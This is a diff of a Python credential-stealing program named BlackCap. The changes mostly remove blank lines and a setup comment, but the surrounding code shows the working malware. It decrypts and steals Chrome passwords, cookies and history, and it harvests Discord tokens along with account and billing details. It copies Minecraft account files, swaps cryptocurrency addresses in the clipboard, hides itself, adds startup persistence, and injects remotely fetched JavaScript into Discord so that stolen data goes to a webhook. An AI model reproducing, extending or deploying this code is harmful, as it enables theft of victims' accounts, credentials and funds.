@@ -34,23 +34,10 @@ from Crypto.Cipher import AES
 from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
 
-
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 temp = os.getenv("TEMP")
-
 Passw = [];
-
-# `
-#    "yourwebhookurl" = your discord webhook url
-#    "blackcap_inject_url" = my javascript injection (i recommand to not change)
-#    "hide" = you want to hide grabber? ('yes' or 'no')
-#    "dbugkiller" = recommand to let this
-#    "blprggg" = don't touch at this
-#
-# `
-
-
 
 __config__ = {
     'yourwebhookurl': "%WEBHOOK_HERE%",
@@ -108,9 +95,6 @@ __config__ = {
 
 }
 
-
-
-
 infocom = os.getlogin()
 vctm_pc = os.getenv("COMPUTERNAME")
 r4m = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
@@ -120,11 +104,7 @@ BlackCap_Regex = 'https://paste.bingner.com/paste/fhvyp/raw'
 reg_req = requests.get(BlackCap_Regex) 
 clear_reg = r"[\w-]{24}\." + reg_req.text
 
-
-
-
 class Functions(object):
-
     @staticmethod
     def gtmk3y(path: str or os.PathLike):
         if not ntpath.exists(path):
@@ -219,16 +199,7 @@ class Functions(object):
     @staticmethod
     def fetch_conf(e: str) -> str or bool | None:
         return __config__.get(e)
-
-
-
-
-
-
-
-
-
-
+    
 class auto_copy_wallet(Functions):
     def __init__(self):
         self.address_st3aler = self.fetch_conf("addresse_crypto_replacer")
@@ -240,7 +211,6 @@ class auto_copy_wallet(Functions):
         self.address_monero = self.fetch_conf("addresse_monero")
         self.address_ada = self.fetch_conf("addresse_ada")
         self.address_dash = self.fetch_conf("addresse_dash")
-
 
     def address_swap(self):
         try:
@@ -292,14 +262,10 @@ class auto_copy_wallet(Functions):
                     if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:
                         pyperclip.copy(self.address_monero)
                         pyperclip.paste()
-                
-                
         except:
             data = None
-            
-            
+
     def loop_through(self):
-        
         while True:
             self.address_swap()
      
@@ -310,65 +276,33 @@ class auto_copy_wallet(Functions):
 
 class bc_initial_func(Functions):
     def __init__(self):
-        
         self.dscap1 = "https://discord.com/api/v9/users/@me"
-
         self.discord_webhook = self.fetch_conf('yourwebhookurl')
-
         self.hide = self.fetch_conf("hide")
-
         self.pingtype = self.fetch_conf("pingtype")
-
         self.pingonrun = self.fetch_conf("ping")
-        
         self.baseurl = "https://discord.com/api/v9/users/@me"
-
         self.startupexe = self.fetch_conf("startup")
-        
         self.fake_error = self.fetch_conf("fake_error")
-
         self.appdata = os.getenv("localappdata")
-
         self.roaming = os.getenv("appdata")
-        
         self.chrmmuserdtt = ntpath.join(self.appdata, 'Google', 'Chrome', 'User Data')
-
         self.dir, self.temp = mkdtemp(), gettempdir()
-
         inf, net = self.sys_1fo(), self.net_1fo()
-
         self.uuidwndz, self.w1nv3r, self.w1nk33y = inf[0], inf[1], inf[2]
-
         self.ip, self.city, self.country, self.region, self.org, self.loc, self.googlemap = net[0], net[1], net[2], net[3], net[4], net[5], net[6]
-
         self.srtupl0c = ntpath.join(self.roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-
         self.regex_webhook_dsc = "api/webhooks"
-
         self.chrmrgx = re.compile(r'(^profile\s\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE);
-        
         self.baseurl = "https://discord.com/api/v9/users/@me"
-
         self.regex = clear_reg
-
         self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
-
         self.tokens = []
-
         self.bc_id = []
-
         self.sep = os.sep;
-
         self.robloxcookies = [];
-
         self.chrome_key = self.gtmk3y(ntpath.join(self.chrmmuserdtt, "Local State"));
-
-
         os.makedirs(self.dir, exist_ok=True);
-
-
-    
-
 
     def error_remote(self: str) -> str:
         if self.fake_error == "yes":
@@ -391,8 +325,6 @@ class bc_initial_func(Functions):
                 if self.regex_webhook_dsc in self.discord_webhook :
                     httpx.post(self.discord_webhook, json=ping2)
 
-
-
     def startupblackcap(self: str) -> str:
         if self.startupexe == "yes":
             startup_path = os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
@@ -401,16 +333,11 @@ class bc_initial_func(Functions):
                 copy2(argv[0], startup_path)
             else:
                 copy2(argv[0], startup_path)
-
-
                 
     def hidethis(self: str) -> str:
         if self.hide == "yes":
             hide = win32gui.GetForegroundWindow()
             win32gui.ShowWindow(hide, win32con.SW_HIDE)
-
-
-
 
     def bc_exit_this(self):
         shutil.rmtree(self.dir, ignore_errors=True)
@@ -471,16 +398,12 @@ class bc_initial_func(Functions):
 
 
         if self.fetch_conf('kill_discord_process'):
-
             await self.kill_process_id()
-
-
 
         os.makedirs(ntpath.join(self.dir, 'Browsers'), exist_ok=True)
         for name, path in self.browsers.items():
             if not os.path.isdir(path):
                 continue
-
             self.masterkey = self.gtmk3y(path + '\\Local State')
             self.funcs = [
                 self.steal_cookies2,
@@ -513,48 +436,34 @@ class bc_initial_func(Functions):
         self.ping_on_running()
         self.finished_bc()
 
-    
-
     async def _inject_disc(self):
         # TO DO: reduce cognetive complexity
         for _dir in os.listdir(self.appdata):
-
             if 'discord' in _dir.lower():
                 discord = self.appdata + os.sep + _dir
                 for __dir in os.listdir(ntpath.abspath(discord)):
-
                     if re.match(r'app-(\d*\.\d*)*', __dir):
                         app = ntpath.abspath(ntpath.join(discord, __dir))
                         modules = ntpath.join(app, 'modules')
-
-
                         if not ntpath.exists(modules):
                             return
-
-
                         for ___dir in os.listdir(modules):
 
                             if re.match(r"discord_desktop_core-\d+", ___dir):
                                 inj_path = modules + os.sep + ___dir + f'\\discord_desktop_core\\'
-
                                 if ntpath.exists(inj_path):
-
                                     if self.srtupl0c not in argv[0]:
                                         try:
                                             os.makedirs(inj_path + 'blackcap', exist_ok=True)
                                         except PermissionError:
                                             pass
-
                                     if self.regex_webhook_dsc in self.discord_webhook:
-                                        
                                         f = httpx.get(self.fetch_conf('blackcap_inject_url')).text.replace("%WEBHOOK%", self.discord_webhook)#.replace("%num_core_discord%", inj_path + 'index.js')
-                                    
                                     try:
                                         with open(inj_path + 'index.js', 'w', errors="ignore") as indexFile:
                                             indexFile.write(f)
                                     except PermissionError:
                                         pass
-
                                     if self.fetch_conf('kill_discord_process'):
                                         os.startfile(app + self.sep + _dir + '.exe')
 
@@ -733,18 +642,11 @@ class bc_initial_func(Functions):
                                     self.tokens.append(token)
                                     self.bc_id.append(uid)
 
-
-
-
-
-                                    
-
     def random_dir_create(self, _dir: str or os.PathLike = gettempdir()):
         filname = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
         path = os.path.join(_dir, filname)
         open(path, "x")
         return path
-
 
     @extract_try
     def steal_passwords2(self, name: str, path: str, profile: str):
@@ -786,13 +688,6 @@ class bc_initial_func(Functions):
         conn.close()
         os.remove(cookievault)
 
-
-
-
-
-
-
-
     @extract_try
     def steal_passwords(self):
         f = open(ntpath.join(self.dir, 'Google', 'Passwords.txt'), 'w', encoding="cp437", errors='ignore')
@@ -819,19 +714,13 @@ class bc_initial_func(Functions):
                 os.remove(login)
         f.close()
 
-
-
     @extract_try
     def steal_cookies(self):
         f = open(ntpath.join(self.dir, 'Google', 'Cookies.txt'), 'w', encoding="cp437", errors='ignore')
         for prof in os.listdir(self.chrmmuserdtt):
-
             if re.match(self.chrmrgx, prof):
-
                 login_db = ntpath.join(self.chrmmuserdtt, prof, 'Network', 'cookies')
                 login = self.cr34t3_f1lkes()
-
-
                 shutil.copy2(login_db, login)
                 conn = sqlite3.connect(login)
                 cursor = conn.cursor()
@@ -895,57 +784,39 @@ class bc_initial_func(Functions):
     @extract_try
     def steal_history(self):
         f = open(ntpath.join(self.dir, 'Google', 'History.txt'), 'w', encoding="cp437", errors='ignore')
-
         def xtractwbhist(db_cursor):
             web = ""
             db_cursor.execute('SELECT title, url, last_visit_time FROM urls')
             for item in db_cursor.fetchall():
                 web += f"Search Title: {item[0]}\nURL: {item[1]}\nLAST VISIT TIME: {self.cnverttim(item[2]).strftime('%Y/%m/%d - %H:%M:%S')}\n\n"
             return web
-
-
         def xtractwbs3rch(db_cursor):
             db_cursor.execute('SELECT term FROM keyword_search_terms')
             search_terms = ""
-
             for item in db_cursor.fetchall():
                 if item[0] != "":
                     search_terms += f"{item[0]}\n"
-
             return search_terms
-
-
         for prof in os.listdir(self.chrmmuserdtt):
-
             if re.match(self.chrmrgx, prof):
-
                 login_db = ntpath.join(self.chrmmuserdtt, prof, 'History')
                 login = self.cr34t3_f1lkes()
-
                 shutil.copy2(login_db, login)
                 conn = sqlite3.connect(login)
                 cursor = conn.cursor()
-
-
                 search_history = xtractwbs3rch(cursor)
                 web_history = xtractwbhist(cursor)
-
                 f.write(f"{' '*17}SEARCH\n{'-'*50}\n{search_history}\n{' '*17}\n\nLinks History\n{'-'*50}\n{web_history}")
-
                 cursor.close()
                 conn.close()
                 os.remove(login)
         f.close()
-
-
+        
     def natify_matched_tokens(self):
-
         f = open(self.dir + "\\Discord_Info.txt", "w", encoding="cp437", errors='ignore')
-
         for token in self.tokens:
             j = httpx.get(self.dscap1, headers=self.g3t_H(token)).json()
             user = j.get('username') + '#' + str(j.get("discriminator"))
-
             badges = ""
             flags = j['flags']
             if (flags == 1):
@@ -972,15 +843,12 @@ class bc_initial_func(Functions):
                 badges += "Active Developer, "
             if (badges == ""):
                 badges = "None"
-
             email = j.get("email")
             phone = j.get("phone") if j.get("phone") else "No Phone Number attached"
             nitro_data = httpx.get(self.dscap1 + '/billing/subscriptions', headers=self.g3t_H(token)).json()
             has_nitro = False
             has_nitro = bool(len(nitro_data) > 0)
             billing = bool(len(json.loads(httpx.get(self.dscap1 + "/billing/payment-sources", headers=self.g3t_H(token)).text)) > 0)
-
-
             f.write(f"{' '*17}{user}\n{'-'*50}\nBilling?: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nPhone: {phone}\nToken: {token}\nEmail: {email}\n\n")
         f.close()
 
@@ -989,11 +857,7 @@ class bc_initial_func(Functions):
         minecraftpath = ntpath.join(self.dir, 'Minecraft')
         os.makedirs(minecraftpath, exist_ok=True)
         mc = ntpath.join(self.roaming, '.minecraft')
-
-
         tgrb = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt']
-
-
         for _file in tgrb:
             if ntpath.exists(ntpath.join(mc, _file)):
                 shutil.copy2(ntpath.join(mc, _file), minecraftpath + self.sep + _file)
@@ -1264,10 +1128,6 @@ class NoDebugg(Functions):
 if __name__ == "__main__" and os.name == "nt":
     asyncio.run(bc_initial_func().init())
     
-
-
-
-
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 temp = os.getenv("TEMP")
@@ -1338,7 +1198,6 @@ def LoadUrlib(hook, data='', files='', headers=''):
                 return r
         except:
             pass
-
 
 def Trust(Cookies):
     global DETECTED
